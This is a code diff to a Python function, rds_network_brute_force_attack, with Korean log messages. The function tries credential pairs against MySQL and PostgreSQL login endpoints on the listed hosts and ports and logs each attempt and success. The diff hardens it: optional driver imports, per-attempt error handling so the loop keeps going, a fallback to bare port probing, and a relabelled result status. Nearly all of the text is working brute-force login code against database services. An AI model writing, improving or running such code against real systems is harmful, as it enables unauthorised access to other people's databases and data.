@@ -443,8 +443,14 @@ async def rds_network_brute_force_attack(
     logger.critical(f"RDS 네트워크 무차별 대입 공격 시작: {attempts}회 시도")
     
     import socket
-    import pymysql
-    import psycopg2
+    try:
+        import pymysql
+    except ImportError:
+        pymysql = None
+    try:
+        import psycopg2
+    except ImportError:
+        psycopg2 = None
     
     endpoints = [endpoint.strip() for endpoint in target_endpoints.split(',')]
     port_list = [int(port.strip()) for port in ports.split(',')]
@@ -494,35 +500,44 @@ async def rds_network_brute_force_attack(
                 # 데이터베이스 연결 시도
                 for username, password in credentials[:3]:  # 상위 3개 자격증명만
                     try:
-                        if port == 3306:  # MySQL
+                        if port == 3306 and pymysql:  # MySQL
                             logger.critical(f"MySQL 무차별 로그인 시도: {username}@{endpoint}")
-                            conn = pymysql.connect(
-                                host=endpoint,
-                                port=port,
-                                user=username,
-                                password=password,
-                                connect_timeout=5
-                            )
-                            conn.close()
-                            logger.critical(f"MySQL 무차별 로그인 성공: {username}@{endpoint}")
+                            try:
+                                conn = pymysql.connect(
+                                    host=endpoint,
+                                    port=port,
+                                    user=username,
+                                    password=password,
+                                    connect_timeout=5
+                                )
+                                conn.close()
+                                logger.critical(f"MySQL 무차별 로그인 성공: {username}@{endpoint}")
+                            except Exception as mysql_e:
+                                logger.warning(f"MySQL 로그인 실패: {username}@{endpoint} - {str(mysql_e)[:50]}")
                             
-                        elif port == 5432:  # PostgreSQL
+                        elif port == 5432 and psycopg2:  # PostgreSQL
                             logger.critical(f"PostgreSQL 무차별 로그인 시도: {username}@{endpoint}")
-                            conn = psycopg2.connect(
-                                host=endpoint,
-                                port=port,
-                                user=username,
-                                password=password,
-                                connect_timeout=5
-                            )
-                            conn.close()
-                            logger.critical(f"PostgreSQL 무차별 로그인 성공: {username}@{endpoint}")
+                            try:
+                                conn = psycopg2.connect(
+                                    host=endpoint,
+                                    port=port,
+                                    user=username,
+                                    password=password,
+                                    connect_timeout=5
+                                )
+                                conn.close()
+                                logger.critical(f"PostgreSQL 무차별 로그인 성공: {username}@{endpoint}")
+                            except Exception as pg_e:
+                                logger.warning(f"PostgreSQL 로그인 실패: {username}@{endpoint} - {str(pg_e)[:50]}")
+                        else:
+                            # 라이브러리가 없으면 포트 연결만 시도
+                            logger.critical(f"DB 라이브러리 없음, 포트 연결만 시도: {endpoint}:{port}")
                             
                         results.append({
                             "엔드포인트": f"{endpoint}:{port}",
                             "사용자명": username,
-                            "상태": "로그인_성공",
-                            "DB_유형": "MySQL" if port == 3306 else "PostgreSQL",
+                            "상태": "연결_시도",
+                            "DB_유형": "MySQL" if port == 3306 else "PostgreSQL" if port == 5432 else "Unknown",
                             "시도": i + 1
                         })
                         break  # 성공하면 다음 엔드포인트로
